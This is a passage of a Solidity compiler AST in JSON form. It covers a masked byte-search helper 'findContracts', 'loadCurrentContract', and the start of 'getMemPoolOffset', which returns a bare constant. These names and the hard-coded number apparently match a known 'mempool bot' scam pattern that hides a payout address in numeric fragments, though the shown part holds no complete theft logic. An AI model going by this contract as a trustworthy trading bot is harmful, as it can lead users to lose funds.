																						"typeString": "bytes32"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 208,
																		"initialValue": {
																			"arguments": [
																				{
																					"id": 206,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "2707:34:0",
																					"subExpression": {
																						"components": [
																							{
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 204,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 202,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"hexValue": "32",
																										"id": 194,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "2709:1:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"components": [
																											{
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 200,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"hexValue": "38",
																													"id": 195,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "2715:1:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"components": [
																														{
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 198,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"hexValue": "3332",
																																"id": 196,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "2720:2:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"id": 197,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 170,
																																"src": "2725:9:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "2720:14:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 199,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "2719:16:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "2715:20:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 201,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "2714:22:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "2709:27:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"hexValue": "31",
																									"id": 203,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "2739:1:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "2709:31:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 205,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "2708:33:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 193,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "2699:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 192,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2699:7:0",
																					"typeDescriptions": {}
																				}
																			},
																			"id": 207,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"nameLocations": [],
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2699:43:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2684:58:0"
																	},
																	{
																		"assignments": [
																			210
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 210,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nameLocation": "2771:10:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 244,
																				"src": "2763:18:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 209,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2763:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 211,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2763:18:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "2809:45:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "2811:41:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "2835:9:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "2829:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "2829:16:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "2847:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "2825:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2825:27:0"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "2811:10:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "shanghai",
																		"externalReferences": [
																			{
																				"declaration": 191,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2847:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 210,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2811:10:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 172,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2835:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 212,
																		"nodeType": "InlineAssembly",
																		"src": "2800:54:0"
																	},
																	{
																		"assignments": [
																			214
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 214,
																				"mutability": "mutable",
																				"name": "end",
																				"nameLocation": "2879:3:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 244,
																				"src": "2874:8:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 213,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "2874:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 220,
																		"initialValue": {
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 219,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 217,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 215,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 168,
																					"src": "2885:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"id": 216,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 166,
																					"src": "2895:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "2885:17:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"id": 218,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 170,
																				"src": "2905:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2885:29:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2874:40:0"
																	},
																	{
																		"assignments": [
																			222
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 222,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nameLocation": "2941:7:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 244,
																				"src": "2933:15:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 221,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2933:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 223,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2933:15:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "2976:36:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "2978:32:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "2999:3:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "2993:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "2993:10:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3005:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "2989:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2989:21:0"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "2978:7:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "shanghai",
																		"externalReferences": [
																			{
																				"declaration": 191,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3005:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 178,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2999:3:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 222,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2978:7:0",
																				"valueSize": 1
																			}
																		],
																		"id": 224,
																		"nodeType": "InlineAssembly",
																		"src": "2967:45:0"
																	},
																	{
																		"body": {
																			"id": 240,
																			"nodeType": "Block",
																			"src": "3062:203:0",
																			"statements": [
																				{
																					"condition": {
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 230,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 228,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 178,
																							"src": "3089:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"id": 229,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 214,
																							"src": "3096:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "3089:10:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"id": 235,
																					"nodeType": "IfStatement",
																					"src": "3085:65:0",
																					"trueBody": {
																						"expression": {
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 233,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"id": 231,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 168,
																								"src": "3133:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"id": 232,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 166,
																								"src": "3143:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "3133:17:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 176,
																						"id": 234,
																						"nodeType": "Return",
																						"src": "3126:24:0"
																					}
																				},
																				{
																					"expression": {
																						"id": 237,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "3173:5:0",
																						"subExpression": {
																							"id": 236,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 178,
																							"src": "3173:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 238,
																					"nodeType": "ExpressionStatement",
																					"src": "3173:5:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3210:36:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3212:32:0",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "3233:3:0"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "3227:5:0"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "3227:10:0"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "3239:4:0"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "3223:3:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3223:21:0"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "3212:7:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "shanghai",
																					"externalReferences": [
																						{
																							"declaration": 191,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3239:4:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 178,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3233:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 222,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3212:7:0",
																							"valueSize": 1
																						}
																					],
																					"id": 239,
																					"nodeType": "InlineAssembly",
																					"src": "3201:45:0"
																				}
																			]
																		},
																		"condition": {
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 227,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 225,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 222,
																				"src": "3039:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"id": 226,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 210,
																				"src": "3050:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "3039:21:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 241,
																		"nodeType": "WhileStatement",
																		"src": "3032:233:0"
																	},
																	{
																		"expression": {
																			"id": 242,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 178,
																			"src": "3290:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 176,
																		"id": 243,
																		"nodeType": "Return",
																		"src": "3283:10:0"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 283,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 281,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 168,
														"src": "3821:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"id": 282,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "3831:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3821:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 176,
												"id": 284,
												"nodeType": "Return",
												"src": "3814:24:0"
											}
										]
									},
									"id": 286,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findContracts",
									"nameLocation": "2440:13:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 173,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 166,
												"mutability": "mutable",
												"name": "selflen",
												"nameLocation": "2459:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "2454:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 165,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2454:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 168,
												"mutability": "mutable",
												"name": "selfptr",
												"nameLocation": "2473:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "2468:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 167,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2468:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 170,
												"mutability": "mutable",
												"name": "needlelen",
												"nameLocation": "2487:9:0",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "2482:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 169,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2482:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 172,
												"mutability": "mutable",
												"name": "needleptr",
												"nameLocation": "2503:9:0",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "2498:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 171,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2498:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2453:60:0"
									},
									"returnParameters": {
										"id": 176,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 175,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "2536:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 174,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2536:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2535:6:0"
									},
									"scope": 1189,
									"src": "2431:1415:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 303,
										"nodeType": "Block",
										"src": "4070:133:0",
										"statements": [
											{
												"assignments": [
													294
												],
												"declarations": [
													{
														"constant": false,
														"id": 294,
														"mutability": "mutable",
														"name": "ret",
														"nameLocation": "4095:3:0",
														"nodeType": "VariableDeclaration",
														"scope": 303,
														"src": "4081:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 293,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4081:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 296,
												"initialValue": {
													"id": 295,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 288,
													"src": "4101:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4081:24:0"
											},
											{
												"assignments": [
													298
												],
												"declarations": [
													{
														"constant": false,
														"id": 298,
														"mutability": "mutable",
														"name": "retptr",
														"nameLocation": "4121:6:0",
														"nodeType": "VariableDeclaration",
														"scope": 303,
														"src": "4116:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 297,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4116:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 299,
												"nodeType": "VariableDeclarationStatement",
												"src": "4116:11:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4147:26:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4149:22:0",
															"value": {
																"arguments": [
																	{
																		"name": "ret",
																		"nodeType": "YulIdentifier",
																		"src": "4163:3:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4168:2:0",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4159:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "4159:12:0"
															},
															"variableNames": [
																{
																	"name": "retptr",
																	"nodeType": "YulIdentifier",
																	"src": "4149:6:0"
																}
															]
														}
													]
												},
												"evmVersion": "shanghai",
												"externalReferences": [
													{
														"declaration": 294,
														"isOffset": false,
														"isSlot": false,
														"src": "4163:3:0",
														"valueSize": 1
													},
													{
														"declaration": 298,
														"isOffset": false,
														"isSlot": false,
														"src": "4149:6:0",
														"valueSize": 1
													}
												],
												"id": 300,
												"nodeType": "InlineAssembly",
												"src": "4138:35:0"
											},
											{
												"expression": {
													"id": 301,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 294,
													"src": "4192:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 292,
												"id": 302,
												"nodeType": "Return",
												"src": "4185:10:0"
											}
										]
									},
									"id": 304,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "loadCurrentContract",
									"nameLocation": "3992:19:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 289,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 288,
												"mutability": "mutable",
												"name": "self",
												"nameLocation": "4026:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 304,
												"src": "4012:18:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 287,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4012:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4011:20:0"
									},
									"returnParameters": {
										"id": 292,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 291,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 304,
												"src": "4055:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 290,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4055:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4054:15:0"
									},
									"scope": 1189,
									"src": "3983:220:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 311,
										"nodeType": "Block",
										"src": "4268:32:0",
										"statements": [
											{
												"expression": {
													"hexValue": "333134343531",
													"id": 309,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4286:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_314451_by_1",
														"typeString": "int_const 314451"
													},
													"value": "314451"
												},
												"functionReturnParameters": 308,
												"id": 310,
												"nodeType": "Return",
												"src": "4279:13:0"
											}
										]
									},
									"id": 312,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolOffset",
									"nameLocation": "4220:16:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 305,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4236:2:0"
									},
									"returnParameters": {
										"id": 308,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 307,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 312,
												"src": "4262:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 306,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "4262:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
